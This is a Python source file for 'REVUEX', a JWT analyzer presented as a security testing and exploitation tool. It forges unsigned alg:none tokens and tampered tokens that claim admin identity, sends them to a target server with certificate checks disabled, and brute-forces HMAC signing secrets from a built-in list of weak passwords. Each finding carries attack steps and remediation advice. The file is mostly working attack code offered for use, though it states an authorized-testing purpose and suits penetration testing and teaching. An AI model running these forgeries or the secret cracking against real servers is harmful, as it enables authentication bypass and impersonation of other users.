#!/usr/bin/env python3
"""
REVUEX - JWT Token Analyzer
Advanced JWT Security Testing & Exploitation

Author: G33L0
Telegram: @x0x0h33l0

DISCLAIMER:
This tool is for educational purposes and authorized security testing only.
"""

import requests
import json
import base64
import hmac
import hashlib
import time
from pathlib import Path
import re

class JWTAnalyzer:
    """JWT token security analysis and exploitation"""
    
    def __init__(self, target, tokens, workspace, delay=2):
        """
        Initialize JWT Analyzer
        
        Args:
            target: Target URL/domain
            tokens: List of JWT tokens found
            workspace: Workspace directory
            delay: Delay between requests
        """
        self.target = target if target.startswith('http') else f"https://{target}"
        self.tokens = tokens if isinstance(tokens, list) else [tokens]
        self.workspace = Path(workspace)
        self.delay = delay
        
        self.headers = {
            'User-Agent': 'REVUEX-JWTAnalyzer/1.0 (Security Research; +https://github.com/G33L0)'
        }
        
        # Common weak secrets for brute force
        self.weak_secrets = [
            'secret', 'password', '123456', 'admin', 'root', 'test',
            'key', 'token', 'jwt', 'secret123', 'password123',
            'qwerty', 'abc123', '1234567890', 'letmein', 'welcome',
            'monkey', 'dragon', 'master', 'sunshine', 'princess',
            '', 'null', 'undefined', 'your-256-bit-secret', 'your-secret',
            'jwt-secret', 'secret-key', 'my-secret', 'super-secret',
        ]
    
    def analyze(self):
        """Analyze JWT tokens for vulnerabilities"""
        vulnerabilities = []
        
        for token in self.tokens:
            if not token or not self._is_jwt(token):
                continue
            
            print(f"            → Analyzing JWT token: {token[:20]}...")
            
            # Decode and parse JWT
            jwt_data = self._decode_jwt(token)
            
            if not jwt_data:
                continue
            
            # Test 1: Algorithm confusion (alg: none)
            none_vuln = self._test_none_algorithm(token, jwt_data)
            if none_vuln:
                vulnerabilities.append(none_vuln)
            
            time.sleep(self.delay)
            
            # Test 2: Algorithm confusion (HS256 to RS256)
            alg_confusion = self._test_algorithm_confusion(token, jwt_data)
            if alg_confusion:
                vulnerabilities.append(alg_confusion)
            
            time.sleep(self.delay)
            
            # Test 3: Weak secret brute force
            weak_secret = self._test_weak_secret(token, jwt_data)
            if weak_secret:
                vulnerabilities.append(weak_secret)
            
            time.sleep(self.delay)
            
            # Test 4: Token expiration
            expiration_vuln = self._test_expiration(token, jwt_data)
            if expiration_vuln:
                vulnerabilities.append(expiration_vuln)
            
            # Test 5: Sensitive data in payload
            sensitive_data = self._test_sensitive_data(jwt_data)
            if sensitive_data:
                vulnerabilities.append(sensitive_data)
            
            # Test 6: Missing signature verification
            no_verify = self._test_signature_verification(token, jwt_data)
            if no_verify:
                vulnerabilities.append(no_verify)
            
            time.sleep(self.delay)
        
        # Save results
        self._save_results(vulnerabilities)
        
        return vulnerabilities
    
    def _is_jwt(self, token):
        """Check if string is a valid JWT format"""
        parts = token.split('.')
        return len(parts) == 3
    
    def _decode_jwt(self, token):
        """Decode JWT token"""
        try:
            parts = token.split('.')
            
            if len(parts) != 3:
                return None
            
            # Decode header
            header_padding = parts[0] + '=' * (4 - len(parts[0]) % 4)
            header = json.loads(base64.urlsafe_b64decode(header_padding))
            
            # Decode payload
            payload_padding = parts[1] + '=' * (4 - len(parts[1]) % 4)
            payload = json.loads(base64.urlsafe_b64decode(payload_padding))
            
            return {
                'token': token,
                'header': header,
                'payload': payload,
                'signature': parts[2]
            }
        except Exception as e:
            return None
    
    def _test_none_algorithm(self, token, jwt_data):
        """Test for 'none' algorithm vulnerability"""
        header = jwt_data['header']
        payload = jwt_data['payload']
        
        # Check if already using 'none'
        if header.get('alg', '').lower() == 'none':
            return {
                'type': 'JWT Algorithm None',
                'severity': 'Critical',
                'url': self.target,
                'description': 'JWT uses "none" algorithm, accepting unsigned tokens',
                'evidence': f'Header contains alg: none',
                'token_sample': token[:50] + '...',
                'attack_path': [
                    'Decode the JWT token',
                    'Modify payload (e.g., change user ID or role)',
                    'Set algorithm to "none" in header',
                    'Remove signature (empty string)',
                    'Send modified token to server',
                    'Server accepts unsigned token'
                ],
                'remediation': [
                    'Never accept "none" algorithm',
                    'Enforce signature verification',
                    'Use strong algorithms (RS256, ES256)',
                    'Implement algorithm whitelist'
                ],
                'tags': ['jwt', 'authentication', 'critical']
            }
        
        # Try to exploit by changing to 'none'
        try:
            # Create new header with 'none' algorithm
            new_header = header.copy()
            new_header['alg'] = 'none'
            
            # Encode new token without signature
            header_encoded = base64.urlsafe_b64encode(
                json.dumps(new_header).encode()
            ).decode().rstrip('=')
            
            payload_encoded = base64.urlsafe_b64encode(
                json.dumps(payload).encode()
            ).decode().rstrip('=')
            
            # Create token with empty signature
            none_token = f"{header_encoded}.{payload_encoded}."
            
            # Test if server accepts it
            test_response = self._test_token(none_token)
            
            if test_response and test_response.get('accepted'):
                return {
                    'type': 'JWT None Algorithm Accepted',
                    'severity': 'Critical',
                    'url': self.target,
                    'description': 'Server accepts JWT tokens with "none" algorithm',
                    'evidence': 'Modified token with alg:none was accepted',
                    'token_sample': none_token[:50] + '...',
                    'attack_path': [
                        'Modify JWT header to use "none" algorithm',
                        'Remove signature from token',
                        'Server accepts unsigned token',
                        'Attacker can forge any token'
                    ],
                    'remediation': [
                        'Reject tokens with "none" algorithm',
                        'Always verify signatures',
                        'Use algorithm whitelist',
                        'Implement strict JWT validation'
                    ],
                    'tags': ['jwt', 'authentication', 'critical']
                }
        except:
            pass
        
        return None
    
    def _test_algorithm_confusion(self, token, jwt_data):
        """Test for algorithm confusion (HS256 vs RS256)"""
        header = jwt_data['header']
        algorithm = header.get('alg', '').upper()
        
        if algorithm == 'RS256' or algorithm == 'ES256':
            return {
                'type': 'JWT Algorithm Confusion Possible',
                'severity': 'High',
                'url': self.target,
                'description': 'JWT uses asymmetric algorithm, potentially vulnerable to algorithm confusion',
                'evidence': f'Token uses {algorithm} algorithm',
                'token_sample': token[:50] + '...',
                'attack_path': [
                    'Obtain the public key from the server',
                    'Change algorithm from RS256 to HS256 in header',
                    'Sign the token using the public key as HMAC secret',
                    'Server might verify using public key as HMAC secret',
                    'Attacker can forge valid tokens'
                ],
                'remediation': [
                    'Enforce expected algorithm on verification',
                    'Never allow algorithm switching',
                    'Use separate keys for different algorithms',
                    'Implement algorithm whitelist per key'
                ],
                'tags': ['jwt', 'authentication', 'algorithm_confusion']
            }
        
        return None
    
    def _test_weak_secret(self, token, jwt_data):
        """Test for weak HMAC secrets"""
        header = jwt_data['header']
        algorithm = header.get('alg', '').upper()
        
        # Only test HMAC algorithms
        if not algorithm.startswith('HS'):
            return None
        
        parts = token.split('.')
        message = f"{parts[0]}.{parts[1]}"
        signature = parts[2]
        
        # Try common weak secrets
        for secret in self.weak_secrets:
            try:
                # Calculate HMAC
                if algorithm == 'HS256':
                    expected_sig = base64.urlsafe_b64encode(
                        hmac.new(
                            secret.encode(),
                            message.encode(),
                            hashlib.sha256
                        ).digest()
                    ).decode().rstrip('=')
                elif algorithm == 'HS384':
                    expected_sig = base64.urlsafe_b64encode(
                        hmac.new(
                            secret.encode(),
                            message.encode(),
                            hashlib.sha384
                        ).digest()
                    ).decode().rstrip('=')
                elif algorithm == 'HS512':
                    expected_sig = base64.urlsafe_b64encode(
                        hmac.new(
                            secret.encode(),
                            message.encode(),
                            hashlib.sha512
                        ).digest()
                    ).decode().rstrip('=')
                else:
                    continue
                
                if expected_sig == signature:
                    return {
                        'type': 'JWT Weak Secret',
                        'severity': 'Critical',
                        'url': self.target,
                        'description': 'JWT is signed with a weak, easily guessable secret',
                        'evidence': f'Secret found: "{secret}"',
                        'token_sample': token[:50] + '...',
                        'cracked_secret': secret,
                        'attack_path': [
                            'Brute force JWT secret using common passwords',
                            f'Secret found: "{secret}"',
                            'Use secret to forge valid tokens',
                            'Impersonate any user or escalate privileges'
                        ],
                        'remediation': [
                            'Use strong, random secrets (256+ bits)',
                            'Store secrets securely (environment variables, secrets manager)',
                            'Rotate secrets regularly',
                            'Consider using asymmetric algorithms (RS256)'
                        ],
                        'tags': ['jwt', 'authentication', 'critical', 'weak_secret']
                    }
            except:
                continue
        
        return None
    
    def _test_expiration(self, token, jwt_data):
        """Test token expiration"""
        payload = jwt_data['payload']
        
        # Check if 'exp' claim exists
        if 'exp' not in payload:
            return {
                'type': 'JWT Missing Expiration',
                'severity': 'Medium',
                'url': self.target,
                'description': 'JWT token does not have an expiration time (exp claim)',
                'evidence': 'No "exp" claim found in token payload',
                'token_sample': token[:50] + '...',
                'attack_path': [
                    'Token never expires',
                    'Stolen tokens remain valid indefinitely',
                    'Increased window for token replay attacks'
                ],
                'remediation': [
                    'Always include "exp" claim in JWT tokens',
                    'Set reasonable expiration times (e.g., 15 minutes)',
                    'Implement token refresh mechanism',
                    'Implement token revocation for logout'
                ],
                'tags': ['jwt', 'session_management']
            }
        
        # Check if expiration time is too long
        exp = payload.get('exp', 0)
        iat = payload.get('iat', 0)
        
        if exp and iat:
            lifetime = exp - iat
            # If token lifetime is more than 24 hours
            if lifetime > 86400:
                hours = lifetime / 3600
                return {
                    'type': 'JWT Long Expiration Time',
                    'severity': 'Low',
                    'url': self.target,
                    'description': 'JWT token has an excessively long expiration time',
                    'evidence': f'Token lifetime: {hours:.1f} hours',
                    'token_sample': token[:50] + '...',
                    'attack_path': [
                        f'Token remains valid for {hours:.1f} hours',
                        'Increases risk if token is compromised',
                        'Extended window for replay attacks'
                    ],
                    'remediation': [
                        'Reduce token expiration time (recommended: 15-60 minutes)',
                        'Implement refresh tokens for longer sessions',
                        'Add token revocation mechanism',
                        'Monitor for suspicious token usage'
                    ],
                    'tags': ['jwt', 'session_management']
                }
        
        return None
    
    def _test_sensitive_data(self, jwt_data):
        """Test for sensitive data in JWT payload"""
        payload = jwt_data['payload']
        token = jwt_data['token']
        
        sensitive_fields = []
        sensitive_keywords = [
            'password', 'secret', 'key', 'private', 'ssn',
            'credit', 'card', 'cvv', 'pin', 'api_key',
            'access_key', 'secret_key', 'token'
        ]
        
        # Check for sensitive field names
        for key, value in payload.items():
            key_lower = key.lower()
            for keyword in sensitive_keywords:
                if keyword in key_lower:
                    sensitive_fields.append({
                        'field': key,
                        'keyword': keyword,
                        'value_preview': str(value)[:20] + '...' if len(str(value)) > 20 else str(value)
                    })
        
        if sensitive_fields:
            return {
                'type': 'Sensitive Data in JWT',
                'severity': 'High',
                'url': self.target,
                'description': 'JWT payload contains potentially sensitive information',
                'evidence': f'Found {len(sensitive_fields)} sensitive fields',
                'sensitive_fields': sensitive_fields,
                'token_sample': token[:50] + '...',
                'attack_path': [
                    'JWT tokens are only base64-encoded, not encrypted',
                    'Anyone can decode and read the payload',
                    'Sensitive data is exposed to anyone with the token'
                ],
                'remediation': [
                    'Never store sensitive data in JWT payload',
                    'Use JWE (JSON Web Encryption) for encrypted tokens',
                    'Store sensitive data server-side, reference by ID',
                    'Minimize data in JWT (only essential claims)'
                ],
                'tags': ['jwt', 'sensitive_data', 'information_disclosure']
            }
        
        return None
    
    def _test_signature_verification(self, token, jwt_data):
        """Test if signature verification can be bypassed"""
        payload = jwt_data['payload']
        
        # Modify payload
        modified_payload = payload.copy()
        if 'user' in modified_payload:
            modified_payload['user'] = 'admin'
        elif 'username' in modified_payload:
            modified_payload['username'] = 'admin'
        elif 'role' in modified_payload:
            modified_payload['role'] = 'admin'
        else:
            modified_payload['test'] = 'modified'
        
        # Create new token with modified payload but original signature
        parts = token.split('.')
        
        modified_payload_encoded = base64.urlsafe_b64encode(
            json.dumps(modified_payload).encode()
        ).decode().rstrip('=')
        
        tampered_token = f"{parts[0]}.{modified_payload_encoded}.{parts[2]}"
        
        # Test if server accepts tampered token
        test_response = self._test_token(tampered_token)
        
        if test_response and test_response.get('accepted'):
            return {
                'type': 'JWT Signature Not Verified',
                'severity': 'Critical',
                'url': self.target,
                'description': 'Server accepts JWT tokens without proper signature verification',
                'evidence': 'Modified token with invalid signature was accepted',
                'token_sample': tampered_token[:50] + '...',
                'attack_path': [
                    'Modify JWT payload (e.g., change user to admin)',
                    'Keep original signature (now invalid)',
                    'Server accepts token without verifying signature',
                    'Complete authentication bypass'
                ],
                'remediation': [
                    'ALWAYS verify JWT signatures before trusting payload',
                    'Use well-tested JWT libraries',
                    'Never decode and trust payload without verification',
                    'Implement proper error handling for invalid signatures'
                ],
                'tags': ['jwt', 'authentication', 'critical', 'bypass']
            }
        
        return None
    
    def _test_token(self, token):
        """Test if a token is accepted by the server"""
        try:
            # Try to use token in Authorization header
            test_headers = self.headers.copy()
            test_headers['Authorization'] = f'Bearer {token}'
            
            response = requests.get(
                self.target,
                headers=test_headers,
                timeout=5,
                verify=False
            )
            
            # Consider token accepted if we don't get 401/403
            if response.status_code not in [401, 403]:
                return {'accepted': True, 'status': response.status_code}
            
            return {'accepted': False, 'status': response.status_code}
        except:
            return None
    
    def _save_results(self, vulnerabilities):
        """Save JWT analysis results"""
        jwt_dir = self.workspace / "jwt_analysis"
        jwt_dir.mkdir(exist_ok=True)
        
        output_file = jwt_dir / "jwt_vulnerabilities.json"
        with open(output_file, 'w') as f:
            json.dump({
                'target': self.target,
                'tokens_analyzed': len(self.tokens),
                'vulnerabilities': vulnerabilities
            }, f, indent=2)
